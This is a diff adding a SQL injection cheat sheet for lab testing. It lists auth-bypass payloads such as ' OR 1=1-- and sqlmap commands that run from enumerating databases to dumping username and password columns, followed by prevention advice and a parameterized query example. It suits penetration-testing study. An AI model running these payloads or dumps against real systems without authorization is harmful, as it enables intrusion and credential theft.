@@ -1,0 +1,116 @@
+[X] SQL Injection Command List
+
+# -------------------------
+# BASIC TEST PAYLOADS (LAB USE)
+# -------------------------
+
+[\] ' OR '1'='1
+[/] Basic boolean test payload
+
+[\] ' OR 1=1--
+[/] Auth bypass test (comment termination)
+
+[\] " OR ""="
+[/] Double-quote variation
+
+[\] '
+[/] Break query syntax
+
+[\] '--
+[/] Comment out remainder of query
+
+[\] ' OR 'a'='a
+[/] Always-true condition test
+
+# -------------------------
+# SQLMAP (AUTOMATED TESTING)
+# -------------------------
+
+[\] sqlmap -u "http://example.com?id=1"
+[/] Test parameter for SQL injection
+
+[\] sqlmap -u "http://example.com?id=1" --dbs
+[/] Enumerate databases
+
+[\] sqlmap -u "http://example.com?id=1" -D dbname --tables
+[/] List tables in database
+
+[\] sqlmap -u "http://example.com?id=1" -D dbname -T users --columns
+[/] List table columns
+
+[\] sqlmap -u "http://example.com?id=1" -D dbname -T users -C username,password --dump
+[/] Dump selected data (lab use only)
+
+[\] sqlmap -u "http://example.com?id=1" --batch
+[/] Non-interactive mode
+
+[\] sqlmap -r request.txt
+[/] Use raw HTTP request
+
+# -------------------------
+# DETECTION TECHNIQUES
+# -------------------------
+
+[\] Boolean-based testing
+[/] Compare true vs false responses
+
+[\] Time-based testing
+[/] Detect delays (e.g., sleep functions)
+
+[\] Error-based testing
+[/] Observe database error messages
+
+[\] Union-based testing
+[/] Inject UNION queries to extract data
+
+# -------------------------
+# PREVENTION (CRITICAL)
+# -------------------------
+
+[\] Use prepared statements
+[/] Prevent injection by design
+
+[\] Use parameterized queries
+[/] Separate data from code
+
+[\] Validate input strictly
+[/] Reject unexpected characters
+
+[\] Use least privilege DB accounts
+[/] Limit potential damage
+
+[\] Disable verbose DB errors
+[/] Prevent information leakage
+
+# -------------------------
+# SAFE QUERY EXAMPLE
+# -------------------------
+
+[\] SELECT * FROM users WHERE username = ? AND password = ?
+[/] Parameterized query (secure)
+
+# -------------------------
+# TESTING WORKFLOW
+# -------------------------
+
+[\] Identify inputs (forms, URLs, headers)
+[/] Find injection points
+
+[\] Send test payloads
+[/] Observe behavior changes
+
+[\] Automate with sqlmap
+[/] Efficient enumeration (lab only)
+
+[\] Analyze responses
+[/] Look for errors, delays, anomalies
+
+# -------------------------
+# PIPELINE EXAMPLES
+# -------------------------
+
+[\] sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+[/] Test vulnerable training site
+
+[\] sqlmap -r request.txt --batch --level 2
+[/] Automated testing from captured request
